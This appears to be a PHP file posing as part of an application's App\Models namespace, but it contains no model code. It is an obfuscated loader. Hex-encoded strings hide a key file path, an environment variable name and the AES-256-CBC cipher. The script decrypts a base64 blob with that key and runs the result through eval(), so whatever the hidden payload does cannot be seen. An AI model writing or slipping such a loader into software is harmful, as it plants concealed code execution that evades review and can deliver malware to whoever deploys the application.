<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('o4VN4brlNxfn4DjabKCTxw==');

$c=base64_decode(

'sE7FhwBuM7MSj1lgMvm5Z+xM+URMc24h7cWXT1k82aP0sKwi4uR/PhT9lwldvu3s83t7cYz49e3G' .
'M24aWujqK+LGjB5+ykfWPuSNjLpbLmzPlINy8dUwhu9QtKUbbBkkOeTE4PaYpfGU6fyKXtGYyLsq' .
'TKvFqtPEvv5jrD0WepgZDJM2b1S0Zym4ductxExmH4Bu94/1Nk234GWXkpHyInfw9H+kMoBpfCK8' .
'qipJS/nN3QwJniplYoRpFN6q5tkDdw1vzPu+Mk+0ZsIU8HpAURE3P+Et8CjLbJ0fexyz7qUE0Sh7' .
'QQHgZCyFypXWeVlpfPy2HWrbhWU+HEoTKUu5Uwmaq4hjiRZhCA9v4Yczf5Kg3lOhn6UOq2TDtSxQ' .
'444OCyUwF3tTTJU4cm0vg0ZmTqadXwNbIpZKmAqh74ElXuD8OlwilFZddN5+wRIfvvffAHJeWVZe' .
'NvDf61eHbUepQKU/Te+yDH9VSALtSkYa6922EOc/MUQvOD3bxvbqLyWhbhusiwCogTPdSnDeQxeG' .
'3V1eMn/ICjC67L0C5a/apTnqbIENfYSN+4n/r9oeaQIyFOCLwtSvt4d/HSwbVAZOig8yvlGn4iBz' .
'ugYUdWZlGguZl2KpKeg9aF0C/I+PsiwXciyxozWXeoNGT6FeuDdlqgmTMJuDMRMm3hBFbu/25BnM' .
'kC7tyf7XgirZhMgNrI5uE/Cwsoaa27M1q5Tied6OcMN2ZADW7xjnf9G29yYy6F4eCUDj3OkO2Dl6' .
'qJVKB81Tl4FuFVTQzpqTGxC2Wua9rA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

